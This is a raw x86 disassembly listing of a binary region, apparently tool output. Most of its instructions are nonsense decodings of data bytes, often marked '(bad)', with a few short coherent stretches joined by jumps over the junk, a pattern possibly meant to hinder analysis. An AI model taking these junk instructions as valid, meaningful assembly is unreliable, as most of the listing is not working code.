  4020f6:	or     BYTE PTR [eax-0x345417b4],bl
  4020fc:	test   al,0x18
  4020fe:	or     al,0xe6
  402100:	(bad)  
  402101:	jmp    0x40217f
  402103:	jno    0x402174
  402105:	ins    BYTE PTR es:[edi],dx
  402106:	je     0x40209d
  402108:	pop    ecx
  402109:	mov    dl,0xb8
  40210b:	pop    ebp
  40210c:	(bad)  
  40210d:	mov    ecx,0x9b50dfe5
  402112:	xchg   ebx,eax
  402113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402114:	lods   al,BYTE PTR ds:[esi]
  402115:	or     DWORD PTR [ecx],eax
  402117:	(bad)  
  402119:	cld    
  40211a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40211b:	sbb    eax,esp
  40211d:	aam    0x89
  40211f:	das    
  402120:	pop    ebp
  402121:	inc    eax
  402122:	popa   
  402123:	fwait
  402124:	cli    
  402125:	mov    BYTE PTR [edx-0x18d75e9],ah
  40212b:	loopne 0x40215c
  40212d:	sbb    ebp,ecx
  40212f:	jge    0x40213c
  402131:	mov    ebp,0xb3d016f3
  402136:	or     eax,0x3db4ff8c
  40213b:	in     al,dx
  40213c:	sub    eax,0xbd314f1c
  402141:	inc    esi
  402142:	inc    esp
  402143:	or     dh,BYTE PTR [esi-0x4b3dd60b]
  402149:	add    DWORD PTR [di-0xc],0x62
  40214e:	dec    esi
  40214f:	push   eax
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	mov    ecx,0x1e154bcf
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x4021df
  402176:	cmp    eax,0x4dd6ea5f
  40217b:	adc    ch,bh
  40217d:	fwait
  40217e:	and    ebx,esi
  402180:	retf   0x4448
  402183:	jp     0x4021bd
  402185:	imul   esi,DWORD PTR [edx],0x40
  402188:	repnz stc 
  40218a:	ins    BYTE PTR es:[edi],dx
  40218b:	mov    eax,ds:0xbd59b305
  402190:	mov    BYTE PTR [ebx-0x60687729],ah
  402196:	jno    0x40220c
  402198:	xor    DWORD PTR [ecx+0x70],0x7083ef41
  40219f:	shl    DWORD PTR [bp+di+0x94c],1
  4021a4:	or     ah,BYTE PTR [ecx]
  4021a6:	or     eax,0x674aa891
  4021ab:	ins    DWORD PTR es:[edi],dx
  4021ac:	push   0xffffff8e
  4021ae:	fstp   QWORD PTR [esi-0x10]
  4021b1:	sbb    eax,0xd45b2eea
  4021b6:	wrmsr  
  4021b8:	fwait
  4021b9:	repz gs mov dh,0x4
  4021bd:	dec    ecx
  4021be:	xchg   esp,eax
  4021bf:	fidivr WORD PTR [ecx+0x1d]
  4021c2:	repz fist WORD PTR [ebp-0x4b]
  4021c6:	int3   
  4021c7:	mov    ch,0xf3
  4021c9:	cs dec esp
  4021cb:	stos   DWORD PTR es:[edi],eax
  4021cc:	inc    edx
  4021cd:	nop
  4021ce:	inc    ecx
  4021cf:	mov    ds:0xf903bc0a,al
  4021d4:	in     eax,0xad
  4021d6:	push   ss
  4021d7:	sti    
  4021d8:	cmp    eax,0xf175cc29
  4021dd:	lds    edi,FWORD PTR [ebp-0x79]
  4021e0:	sub    DWORD PTR [esi],ebx
  4021e2:	retfw  
  4021e4:	mov    al,0x26
  4021e6:	mov    bl,0x4c
  4021e8:	pop    ebx
  4021e9:	adc    BYTE PTR [eax],0x7e
  4021ec:	jmp    DWORD PTR [edx+0x1]
  4021ef:	arpl   bp,cx
  4021f1:	idiv   BYTE PTR [ebx]
  4021f3:	int3   
  4021f4:	frstor [edx-0x14]
  4021f7:	jmp    0x2d29:0xf02c9c02
  4021fe:	inc    eax
  4021ff:	jmp    0xd0c3a489
  402204:	mov    edi,0x77269498
  402209:	outs   dx,DWORD PTR ds:[esi]
  40220a:	sahf   
  40220b:	inc    esi
  40220c:	push   edi
  40220d:	adc    eax,0x608ef59a
  402212:	xchg   esp,eax
  402213:	pop    esp
  402214:	imul   eax,DWORD PTR [ebp-0x4874f02b],0x79
  40221b:	fidivr DWORD PTR [ebx-0x55246891]
  402221:	push   0xffffff96
  402223:	xor    eax,0x11fc285b
  402228:	push   ds
  402229:	rol    BYTE PTR [eax+ebx*8-0x17],0xd4
  40222e:	aaa    
  40222f:	sar    esp,1
  402231:	inc    eax
  402232:	ds das 
  402234:	or     ebp,DWORD PTR [ecx-0x68]
  402237:	push   cs
  402238:	jno    0x4021fa
  40223a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40223b:	add    eax,0x1d169540
  402240:	les    ebp,FWORD PTR [ebx]
  402242:	retf   0x856e
  402245:	call   0xf8d934f9
  40224a:	stos   DWORD PTR es:[edi],eax
  40224b:	mov    bl,0xfa
  40224d:	add    DWORD PTR [ebx],0x20c84f6f
  402253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402254:	out    dx,eax
  402255:	xor    DWORD PTR gs:[eax-0x7],esp
  402259:	push   cs
  40225a:	add    ch,ch
  40225c:	sahf   
  40225d:	xchg   ebp,eax
  40225e:	jno    0x40229d
  402260:	pop    ecx
  402261:	add    esp,DWORD PTR [esi+ebp*4]
  402264:	jmp    0x402210
  402266:	dec    edx
  402267:	jne    0x40227e
  402269:	cmp    BYTE PTR [edx],0x76
  40226c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40226d:	push   eax
  40226e:	push   edi
  40226f:	lea    ebp,[ebx+0x23]
  402272:	mov    edx,0xcdcac48b
  402277:	test   al,0xbb
  402279:	inc    esi
  40227a:	xchg   esp,eax
  40227b:	sub    ebp,DWORD PTR [ebp+ebx*8+0x62]
  40227f:	sbb    BYTE PTR [edx-0x24],al
  402282:	fstp   TBYTE PTR [ebp+0x1c89b770]
  402288:	scas   al,BYTE PTR es:[edi]
  402289:	js     0x4022a1
  40228b:	clc    
  40228c:	ins    DWORD PTR es:[edi],dx
  40228d:	or     DWORD PTR [ebx-0x5ea7db6a],ebp
  402293:	fsubr  QWORD PTR [edi+0x5819bc98]
  402299:	ins    BYTE PTR es:[edi],dx
  40229a:	in     al,dx
  40229b:	add    edx,DWORD PTR ds:0x42969750
  4022a1:	jle    0x4022ff
  4022a3:	icebp  
  4022a4:	mov    al,ds:0xf3e7bd2
  4022a9:	stos   BYTE PTR es:[edi],al
  4022aa:	dec    edi
  4022ab:	aaa    
  4022ac:	pop    es
  4022ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022ae:	loopne 0x402309
  4022b0:	push   eax
  4022b1:	cmp    eax,0x672eb84
  4022b6:	sbb    dh,BYTE PTR [esi]
  4022b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022b9:	dec    esi
  4022ba:	hlt    
  4022bb:	lods   eax,DWORD PTR ds:[esi]
  4022bc:	aad    0xc8
  4022be:	mov    bh,0xd9
  4022c0:	out    dx,eax
  4022c1:	and    al,0xd8
  4022c3:	repz jb 0x40228f
  4022c6:	fistp  QWORD PTR [edx-0x2e]
  4022c9:	bound  ecx,QWORD PTR [esi+eax*4-0x62932332]
  4022d0:	nop
  4022d1:	js     0x402294
  4022d3:	repz pop ss
  4022d5:	pop    edx
  4022d6:	xchg   ebx,eax
  4022d7:	ins    DWORD PTR es:[edi],dx
  4022d8:	add    BYTE PTR es:[edx-0x52],0x60
  4022dd:	aad    0xfa
  4022df:	and    BYTE PTR [ebp-0x3e],bl
  4022e2:	pmaxsw mm2,QWORD PTR [ebp+0x26]
  4022e6:	mov    esp,fs
  4022e8:	dec    ecx
  4022e9:	fwait
  4022ea:	and    al,0x2
  4022ec:	jb     0x402328
  4022ee:	or     eax,0x54ad8c8f
  4022f3:	push   edi
  4022f4:	cmp    al,0x10
  4022f6:	mov    bh,0x52
  4022f8:	adc    BYTE PTR [eax-0x75],dl
  4022fb:	inc    ebp
  4022fc:	call   0x1d8a38c
  402301:	add    BYTE PTR [eax],al
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	cwde   
  402358:	and    BYTE PTR [edi+0x7e039a5a],ah
  40235e:	jle    0x40235a
  402360:	jg     0x4023e0
  402362:	jle    0x402314
  402364:	aas    
  402365:	lea    esi,[eax]
  402367:	out    dx,eax
  402368:	fldcw  WORD PTR [eax+0x7a9597d]
  40236e:	adc    esi,DWORD PTR [esi-0x60]
  402371:	mov    ebx,0x8d3b9ad
  402376:	inc    eax
  402377:	push   es
  402378:	or     al,0x84
  40237a:	dec    eax
  40237b:	sbb    eax,0x8c881430
  402380:	mov    bl,0x56
  402382:	into   
  402383:	xor    bh,BYTE PTR [edi-0x9762c62]
  402389:	mov    edi,0x3e6987ac
  40238e:	sbb    eax,0xf408d87d
  402393:	cs jbe 0x402356
  402396:	xor    esi,DWORD PTR [edx]
  402398:	inc    ecx
  402399:	fs int3 
  40239b:	jno    0x402361
  40239d:	mov    ebp,0x676522e9
  4023a2:	jne    0x40237d
  4023a4:	fnstcw WORD PTR [ebx]
  4023a6:	das    
  4023a7:	fwait
  4023a8:	xchg   dx,ax
  4023aa:	add    al,0xc8
  4023ac:	and    DWORD PTR ss:[edx],0xdcb2bd75
  4023b3:	sbb    BYTE PTR [eax+0x4b],bl
  4023b6:	pushf  
  4023b7:	or     DWORD PTR [ebx-0x4c],esi
  4023ba:	jmp    0xd00f:0xc05a5e2b
  4023c1:	xchg   edi,eax
  4023c2:	(bad)  
  4023c3:	cmc    
  4023c4:	clc    
  4023c5:	or     eax,0xc677e88
  4023ca:	xor    DWORD PTR [eax-0x50616370],ecx
  4023d0:	or     BYTE PTR [esi],dh
  4023d2:	jns    0x402386
  4023d4:	mov    ah,BYTE PTR [edi]
  4023d6:	inc    ebp
  4023d7:	test   BYTE PTR [edx-0x3d235632],0x95
  4023de:	test   al,0x5e
  4023e0:	imul   edi,DWORD PTR [edx+esi*2-0x73],0x6731ea7b
  4023e8:	mov    al,ds:0xc960fcf5
  4023ed:	adc    ebp,esi
  4023ef:	mov    ds:0x1a7c07f7,al
  4023f4:	mov    esi,0x33f25253
  4023f9:	loopne 0x40241f
  4023fb:	jmp    0xb671:0xc06a8efe
  402402:	(bad)  
  402403:	fnsave [edx+0x112e298e]
  402409:	inc    ecx
  40240a:	imul   ecx,DWORD PTR [edi-0x278cfce5],0x1d1253f6
  402414:	add    DWORD PTR cs:[edi+0x5d],esp
  402418:	mov    eax,0xb516f60a
  40241d:	ja     0x402434
  40241f:	dec    eax
  402420:	sahf   
  402421:	jge    0x4024a0
  402423:	pop    ds
  402424:	mov    ds:0x1f04dabe,al
  402429:	jae    0x4024a3
  40242b:	aam    0x3
  40242d:	sub    ecx,DWORD PTR [esi+0x32]
  402430:	pop    edi
  402431:	push   0x3e69ff8c
  402436:	out    dx,al
  402437:	inc    ebx
  402438:	mov    ebx,0xa7b8f8b1
  40243d:	or     eax,0xa3be28a0
  402442:	(bad)  
  402443:	enter  0x48f6,0xf3
  402447:	pop    esi
  402448:	mov    ds:0x75eea001,al
  40244d:	fld    st(7)
  40244f:	mov    cs,WORD PTR [edi-0x381133b5]
  402455:	sub    DWORD PTR [eax],0x8b7b5ca1
  40245b:	call   0x68d0d927
  402460:	jne    0x402487
  402462:	ret    0x7620
  402465:	mov    eax,ds:0x40113fc7
  40246a:	popa   
  40246b:	rcl    BYTE PTR [eax],cl
  40246d:	mov    esi,0x5e094d3b
  402472:	out    0xfe,eax
  402474:	jo     0x40245c
  402476:	adc    esi,DWORD PTR [esi+0x18d67689]
  40247c:	inc    eax
  40247d:	cmp    bh,BYTE PTR [edx]
  40247f:	jbe    0x4024f0
  402481:	in     eax,dx
  402482:	mov    dl,0xcc
  402484:	or     bl,BYTE PTR [edx-0x7a]
  402487:	out    dx,al
  402488:	xchg   ebp,eax
  402489:	cmp    ecx,ecx
  40248b:	mov    al,0x66
  40248d:	sbb    BYTE PTR [esp+0x59],cl
  402491:	sbb    BYTE PTR [ebp+0x5f40001a],bh
  402497:	test   esp,0xfb6e1da7
  40249d:	aas    
  40249e:	dec    esi
  40249f:	mov    esi,0x4603d560
  4024a4:	fs into 
  4024a6:	add    edx,esi
  4024a8:	and    cl,BYTE PTR [edx-0x4f18530b]
  4024ae:	cwde   
  4024af:	cmp    eax,0x94174e5f
  4024b4:	jbe    0x40250e
  4024b6:	xchg   edx,eax
  4024b7:	test   eax,0xf0df88c5
  4024bc:	jns    0x4024a8
  4024be:	cmp    BYTE PTR [ebp-0x70],dh
  4024c1:	pusha  
  4024c2:	mov    edi,0x6266b027
  4024c7:	stos   DWORD PTR es:[edi],eax
  4024c8:	mov    esi,0xf6c6fa9c
  4024cd:	out    dx,eax
  4024ce:	stc    
  4024cf:	(bad)  
  4024d0:	adc    al,bh
  4024d2:	dec    esi
  4024d3:	stc    
  4024d4:	push   esp
  4024d5:	jb     0x4024b2
  4024d7:	xchg   BYTE PTR [esp+esi*1],cl
  4024da:	fucomp st(6)
  4024dc:	fsubr  QWORD PTR fs:[edx+0x12]
  4024e0:	jno    0x4024c1
  4024e2:	mov    ah,0x3e
  4024e4:	repnz sub eax,DWORD PTR [eax-0x760fba75]
  4024eb:	inc    ebp
  4024ec:	lock mov eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	jge    0x4024ea
  40250f:	ficom  DWORD PTR [edx+0x7e7e0126]
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x40257e
  40251a:	adc    eax,edi
  40251c:	pop    ecx
  40251d:	push   0x28f5151b
  402522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402523:	iret   
  402524:	in     eax,0xf6
  402526:	mov    ah,0x59
  402528:	xor    DWORD PTR [ebx-0x7a8350ba],ecx
  40252e:	std    
  40252f:	arpl   WORD PTR [eax],bx
  402531:	xchg   edx,eax
  402532:	int3   
  402533:	xchg   DWORD PTR [ebx*8-0x4b7493d1],edi
  40253a:	xchg   esi,eax
  40253b:	jle    0x402504
  40253d:	xlat   BYTE PTR ds:[ebx]
  40253e:	imul   edi,DWORD PTR ds:0xd42e90cc,0x47de470
  402548:	cmp    dh,BYTE PTR [eax+edi*2-0x2]
  40254c:	lods   eax,DWORD PTR ds:[esi]
  40254d:	mov    BYTE PTR [ebp+0x12],ah
  402550:	das    
  402551:	pop    esp
  402552:	dec    esi
  402553:	cld    
  402554:	mov    bh,0x73
  402556:	outs   dx,BYTE PTR ds:[esi]
  402557:	(bad)  
  402559:	test   eax,0x79e5c07f
  40255e:	call   0x48f1:0x6ff234a
  402565:	inc    ebx
  402566:	into   
  402567:	sbb    ecx,ebp
  402569:	push   edi
  40256a:	loope  0x402588
  40256c:	mov    al,0x5e
  40256e:	mov    edi,0xbde1c3aa
  402574:	dec    ebx
  402575:	or     dl,ch
  402577:	popa   
  402578:	mov    dl,0x18
  40257a:	pop    ecx
  40257b:	icebp  
  40257c:	jmp    0x40253b
  40257e:	das    
  40257f:	mov    bh,BYTE PTR [esi-0x2f]
  402582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402583:	xor    esi,esi
  402585:	sub    DWORD PTR [edi],ebx
  402587:	jg     0x40257a
  402589:	outs   dx,BYTE PTR ds:[esi]
  40258a:	sub    bl,BYTE PTR [ebx+0x31]
  40258d:	ret    0x940f
  402590:	mov    DWORD PTR [esi-0x67],0xb5084fe9
  402597:	cmp    bh,BYTE PTR [esi-0x21d4afc1]
  40259d:	ret    0x9936
  4025a0:	outs   dx,BYTE PTR ds:[esi]
  4025a1:	in     al,dx
  4025a2:	mov    ah,0x83
  4025a4:	dec    edi
  4025a5:	dec    ebx
  4025a6:	mov    ecx,0xf416ab63
  4025ab:	ret    
  4025ac:	xor    eax,0x56f32ef8
  4025b1:	jg     0x4025f1
  4025b3:	cmp    esi,ebx
  4025b5:	or     BYTE PTR [edi-0x53],bh
  4025b8:	adc    edi,DWORD PTR [edx+0xf]
  4025bb:	xor    ecx,DWORD PTR [edi]
  4025bd:	je     0x402546
  4025bf:	push   ebx
  4025c0:	lea    ecx,[ebp+edi*4-0x4507a522]
  4025c7:	push   cs
  4025c8:	add    BYTE PTR [esi-0x1ebbe207],ah
  4025ce:	mov    ebp,0x2511170c
  4025d3:	adc    al,0x44
  4025d5:	mov    ss,WORD PTR [ebp-0x72271034]
  4025db:	ds pop esp
  4025dd:	popf   
  4025de:	inc    ebp
  4025df:	rol    ebx,cl
  4025e1:	adc    al,bl
  4025e3:	cli    
  4025e4:	mov    edi,0x7a63b1d5
  4025e9:	mov    dh,0x14
  4025eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ec:	retf   0xf8b2
  4025ef:	les    edi,FWORD PTR [esi]
  4025f1:	mov    dl,0xb2
  4025f3:	ret    
  4025f4:	fistp  QWORD PTR [ecx+eiz*2]
  4025f7:	adc    bl,BYTE PTR [ebx+0x7eb689dd]
  4025fd:	mov    bl,0x47
  4025ff:	cmp    bl,BYTE PTR [ebx+eax*4]
  402602:	in     eax,0x5
  402604:	outs   dx,DWORD PTR ds:[esi]
  402605:	ins    DWORD PTR es:[edi],dx
  402606:	(bad)  
  402607:	scas   al,BYTE PTR es:[edi]
  402608:	xchg   esi,eax
  402609:	add    al,0x70
  40260c:	or     DWORD PTR ds:0x460fa7fd,esp
  402612:	mov    al,0x3
  402614:	mov    eax,0xdb2fe8d3
  402619:	jg     0x402651
  40261b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40261c:	fistp  WORD PTR [edx+edx*1]
  40261f:	data16 (bad) 
  402621:	enter  0x44fa,0xbb
  402625:	and    al,0xba
  402627:	and    dh,bl
  402629:	xchg   ecx,eax
  40262a:	or     eax,0x43757749
  40262f:	cmp    bl,BYTE PTR [esi-0x595eb017]
  402635:	and    al,0xd5
  402637:	sub    DWORD PTR [edi+0x39fc3e24],ecx
  40263d:	rcl    DWORD PTR [eax+0x57],1
  402640:	push   0x674ed540
  402645:	jmp    0x402639
  402647:	push   ecx
  402648:	pop    eax
  402649:	adc    edx,DWORD PTR [edx-0x27c80e82]
  40264f:	fdiv   DWORD PTR [ecx+0x7]
  402652:	sub    al,0x34
  402654:	jnp    0x40267f
  402656:	pop    edi
  402657:	cwde   
  402658:	(bad)  
  402659:	xchg   edi,eax
  40265a:	fcomi  st,st(6)
  40265c:	mov    al,BYTE PTR [ecx+0x3b886a04]
  402662:	lds    edi,FWORD PTR [ebp-0x2b]
  402665:	push   ebx
  402666:	fldcw  WORD PTR [esi+0x4da2d792]
  40266c:	and    al,BYTE PTR [ebx]
  40266e:	nop
  40266f:	in     eax,dx
  402670:	or     ch,BYTE PTR [eax+0x4b]
  402673:	xor    al,0x4e
  402675:	ror    DWORD PTR [ecx+0xc595625],cl
  40267b:	int    0xcd
  40267d:	cmc    
  40267e:	add    BYTE PTR [esp+eax*2],bh
  402681:	jb     0x4026a8
  402683:	pop    es
  402684:	jecxz  0x4026ac
  402686:	xchg   edx,eax
  402687:	push   esp
  402688:	(bad)  
  40268a:	dec    edx
  40268b:	cmp    BYTE PTR [edx],dl
  40268d:	in     al,0x40
  40268f:	int3   
  402690:	aam    0x5f
  402692:	add    eax,DWORD PTR [ebp-0x3dd0774]
  402698:	sbb    eax,0xbb42891c
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	jle    0x4026a8
  4026d4:	clc    
  4026d5:	dec    esi
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026a3
  4026df:	pop    esp
  4026e0:	stc    
  4026e1:	xchg   edx,eax
  4026e2:	stos   BYTE PTR es:[edi],al
  4026e3:	sbb    al,0xf9
  4026e5:	adc    eax,0xd0520474
  4026ea:	(bad)  
  4026eb:	and    al,0xc4
  4026ed:	or     dh,BYTE PTR [esi]
  4026ef:	jecxz  0x40267b
  4026f1:	jl     0x4026e9
  4026f3:	adc    al,0xaf
  4026f5:	sub    BYTE PTR [esi+eax*4-0x42911fb8],al
  4026fc:	sub    BYTE PTR [eax],dh
  4026fe:	jbe    0x40274c
  402700:	push   cs
  402701:	imul   al
  402703:	ror    DWORD PTR [eax],0x5e
  402706:	cli    
  402707:	pop    ebx
  402708:	xchg   ebp,eax
  402709:	pusha  
  40270a:	sar    DWORD PTR [ebx+0x7e0e833a],0xfe
  402711:	fsub   DWORD PTR [ecx-0x2006f858]
  402717:	int    0x4a
  402719:	mov    ds:0x4446765d,al
  40271e:	repnz stos DWORD PTR es:[edi],eax
  402720:	stos   DWORD PTR es:[edi],eax
  402721:	inc    ecx
  402722:	ins    BYTE PTR es:[edi],dx
  402723:	xor    DWORD PTR [ebp-0xecc24d7],ebp
  402729:	into   
  40272a:	hlt    
  40272b:	ja     0x4026e9
  40272d:	mov    bl,0x76
  40272f:	inc    ecx
  402730:	add    BYTE PTR [ebp-0x53],cl
  402733:	dec    ebx
  402734:	stos   DWORD PTR es:[edi],eax
  402735:	div    BYTE PTR [ebp+0x5d5339c3]
  40273b:	jno    0x402717
  40273d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40273e:	out    dx,eax
  40273f:	stc    
  402740:	(bad)  
  402742:	mov    ds:0x5ebfd792,al
  402747:	out    dx,eax
  402748:	push   edx
  402749:	sub    al,0x64
  40274b:	ja     0x4026e9
  40274d:	add    DWORD PTR [ebx],esp
  40274f:	shr    DWORD PTR [ecx],0x1a
  402752:	xchg   ebx,eax
  402753:	pop    eax
  402754:	rcr    DWORD PTR [ebx+0x6c2349],cl
  40275a:	push   0xfffffff2
  40275c:	adc    edx,DWORD PTR [eax]
  40275e:	mov    cl,0x39
  402760:	sbb    DWORD PTR [eax],esi
  402762:	inc    esp
  402763:	xor    eax,0xeaf207f3
  402768:	jne    0x4026ef
  40276a:	dec    esp
  40276b:	popf   
  40276c:	cs div esp
  40276f:	shr    DWORD PTR [eax+ecx*2-0x5b],cl
  402773:	inc    ebx
  402774:	pusha  
  402775:	mov    ah,0xcd
  402777:	push   0xccdbda5b
  40277c:	push   edi
  40277d:	pushf  
  40277e:	push   ebp
  40277f:	push   0xa707dfaa
  402784:	sbb    DWORD PTR [ecx-0x2],eax
  402787:	jnp    0x402747
  402789:	lahf   
  40278a:	push   esi
  40278b:	sub    bh,bh
  40278d:	and    eax,0xdad23d70
  402792:	scas   eax,DWORD PTR es:[edi]
  402793:	jmp    0x40271f
  402795:	mov    esi,ss
  402797:	jno    0x402781
  402799:	mov    ds:0xfcb474fe,eax
  40279e:	xchg   edi,eax
  40279f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4027a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027a2:	aam    0x52
  4027a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027a5:	push   edi
  4027a6:	mov    esp,0xc3b39d29
  4027ab:	inc    DWORD PTR [edx+ebp*4+0x71dc9d41]
  4027b2:	sub    al,0xe1
  4027b4:	fs je  0x402772
  4027b7:	idiv   BYTE PTR [ecx+esi*8-0x1b5000a5]
  4027be:	(bad)  
  4027bf:	pop    esi
  4027c0:	outs   dx,DWORD PTR ds:[esi]
  4027c1:	in     al,dx
  4027c2:	mov    ecx,0x10ba2c9a
  4027c7:	pop    ebx
  4027c8:	test   eax,0x71f34874
  4027cd:	push   cs
  4027ce:	push   ds
  4027cf:	push   eax
  4027d0:	sub    edx,DWORD PTR [edx]
  4027d2:	aam    0xa1
  4027d4:	imul   ecx,esi,0xffffffd7
  4027d7:	test   BYTE PTR [esi-0xed304cb],al
  4027dd:	mov    dl,0x67
  4027df:	out    0xdf,al
  4027e1:	cld    
  4027e2:	sub    eax,0x317805d6
  4027e7:	xor    esi,edx
  4027e9:	jbe    0x40286a
  4027eb:	fld    QWORD PTR [esi+0xf]
  4027ee:	sub    cl,BYTE PTR [edi]
  4027f0:	mov    ebx,0xc070512f
  4027f5:	(bad)  
  4027f6:	jge    0x40280f
  4027f8:	in     al,dx
  4027f9:	mov    ds,WORD PTR [eax-0x77c16e20]
  4027ff:	lea    ecx,[edi*1+0x870ae87]
  402806:	jmp    0xc825:0xa987a83e
  40280d:	cli    
  40280e:	call   0x184c:0xfac40894
  402815:	jecxz  0x4027f7
  402817:	xor    eax,0xdac674be
  40281c:	std    
  40281d:	test   al,0xd3
  40281f:	aam    0xc9
  402821:	xor    BYTE PTR [eax-0x4],0x0
  402825:	mov    dl,0xb1
  402827:	rcr    DWORD PTR [ecx+0x1c],1
  40282a:	add    cl,BYTE PTR [ecx]
  40282c:	jg     0x40286d
  40282e:	popa   
  40282f:	das    
  402830:	xor    ch,bl
  402832:	push   cs
  402833:	jmp    0xffcad88
  402838:	sbb    BYTE PTR ds:[eax-0x2f],bl
  40283c:	lock pushf 
  40283e:	dec    esi
  40283f:	and    dh,BYTE PTR [edx-0x57f5d48e]
  402845:	icebp  
  402846:	jno    0x402820
  402848:	mov    dl,0xfb
  40284a:	inc    DWORD PTR [ebp-0x6a0c883]
  402850:	retf   
  402851:	clc    
  402852:	adc    BYTE PTR [eax+ebx*1+0x13ea1f28],cl
  402859:	pop    ebx
  40285a:	or     ebp,DWORD PTR [esi+0x52]
  40285d:	fwait
  40285e:	pop    ecx
  40285f:	and    ebp,DWORD PTR [ecx+ecx*8-0x742fba75]
  402866:	dec    ebp
  402867:	clc    
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	xchg   ebx,eax
  402884:	lea    ebx,[ebx+ebx*4+0x7e7e0c2e]
  40288b:	cli    
  40288c:	jg     0x40290c
  40288e:	jle    0x40286d
  402890:	(bad)  
  402891:	ss mov eax,0x9a9cd7a5
  402897:	mov    ebp,DWORD PTR [edi+ecx*4]
  40289a:	jmp    0x9a60:0xab41354f
  4028a1:	sub    eax,0xd99595a0
  4028a6:	ret    
  4028a7:	and    DWORD PTR [eax-0x29],0xfffffff7
  4028ab:	rcr    BYTE PTR [edx+0x19],0xd9
  4028af:	ret    0xd4d0
  4028b2:	pop    ds
  4028b3:	clc    
  4028b4:	lock (bad) 
  4028b6:	dec    BYTE PTR [edx]
  4028b8:	mov    cl,0xe9
  4028ba:	or     DWORD PTR [ebp-0x50],edx
  4028bd:	in     eax,dx
  4028be:	mov    esi,0x7e0a0bf4
  4028c3:	cmp    BYTE PTR [ecx+0x2958d988],0x86
  4028ca:	sub    eax,0x29ce6839
  4028cf:	xor    al,0x95
  4028d1:	repz push 0x45
  4028d4:	pop    edx
  4028d5:	jle    0x4028d3
  4028d7:	stos   DWORD PTR es:[edi],eax
  4028d8:	push   cs
  4028d9:	ret    
  4028da:	xchg   edi,eax
  4028db:	adc    DWORD PTR [esi-0x26a9b0ed],ebx
  4028e1:	push   edi
  4028e2:	mov    eax,ds:0xb7c8f2d
  4028e7:	rol    bl,0xda
  4028ea:	aas    
  4028eb:	int    0xe6
  4028ed:	push   esp
  4028ee:	sub    eax,0x1058a3b0
  4028f3:	xchg   edx,eax
  4028f4:	sbb    DWORD PTR [ebx+0x7],edi
